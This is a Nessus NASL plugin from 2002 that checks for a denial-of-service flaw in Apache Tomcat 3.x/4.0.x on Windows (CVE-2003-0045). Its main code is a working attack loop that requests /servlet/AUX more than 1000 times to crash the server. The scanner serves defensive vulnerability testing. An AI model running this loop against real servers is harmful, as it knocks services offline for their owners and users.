#
# This script was written by Michel Arboi <arboi@alussinan.org>
# See also script 10930 http_w98_devname_dos.nasl
#
# GPL
#
# Vulnerable servers:
# Apache Tomcat 3.3
# Apache Tomcat 4.0.4
# All versions prior to 4.1.x may be affected as well.
# Apache Tomcat 4.1.10 (and probably higher) is not affected.
# 
# Microsoft Windows 2000
# Microsoft Windows NT may be affected as well.
#
# References:
# Date: Fri, 11 Oct 2002 13:36:55 +0200
# From:"Olaf Schulz" <olaf.schulz@t-systems.com>
# To:cert@cert.org, bugtraq@securityfocus.com, vulnwatch@vulnwatch.org
# Subject: Apache Tomcat 3.x and 4.0.x: Remote denial-of-service vulnerability
#
#

if(description)
{
 script_id(11150);
 script_cve_id("CVE-2003-0045");
 script_version("$Revision: 1.12 $");
 script_name(english:"Tomcat servlet engine MS/DOS device names denial of service");
 
 desc["english"] = "
It was possible to freeze or crash Windows or the web server
by reading a thousand of times a MS/DOS device through Tomcat 
servlet engine, using a file name like /examples/servlet/AUX

A cracker may use this flaw to make your system crash 
continuously, preventing you from working properly.

Solution : Upgrade your Apache Tomcat web server to version 4.1.10.
Risk factor : High";

 desc["francais"] = "
Il a été possible de geler ou tuer Windows ou le serveur web 
en lisant un milliers de fois un périphérique MS/DOS à travers
le moteur de servlet de Tomcat, en utilisant un nom de fichier
comme /examples/servlet/AUX

Un pirate peut utiliser ce problème pour faire continuellement 
rebooter votre système, vous empêchant de travailler correctement.

Solution : mettez à jour votre serveur web Apache Tomcat 
en version 4.1.10

Facteur de risque : Élevé";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Kills Apache Tomcat by reading 1000+ times a MS/DOS device through the servlet engine";
 summary["francais"] = "Tue Apache Tomcat en lisant 1000+ fois un nom de périphérique MS/DOS à travers le moteur de servlet";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_KILL_HOST);
 
 
 script_copyright("This script is Copyright (C) 2002 Michel Arboi");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencies("find_service.nes");
 script_require_ports("Services/www", 80);
 exit(0);
}

# The script code starts here

include("http_func.inc");

start_denial();

port = get_http_port(default:80);

if(! get_port_state(port)) exit(0);

banner = get_http_banner(port:port);
if ("Tomcat" >!< banner)
  exit (0);

if (http_is_dead(port: port)) exit(0);
soc = http_open_socket(port);
if (! soc) exit(0);

# We should know where the servlets are
url = "/servlet/AUX";
req = http_get(item: url, port: port);

for (i = 0; i <= 1000; i = i + 1)
{
  send(socket: soc, data: req);
  http_close_socket(soc);
  soc = http_open_socket(port);
  if (! soc)
  {
    sleep(1);
    soc = http_open_socket(port);
    if (! soc)
      break;
  }
}

if (soc) http_close_socket(soc);
# sleep(1);
alive = end_denial();
if (! alive || http_is_dead(port: port)) security_hole(port);
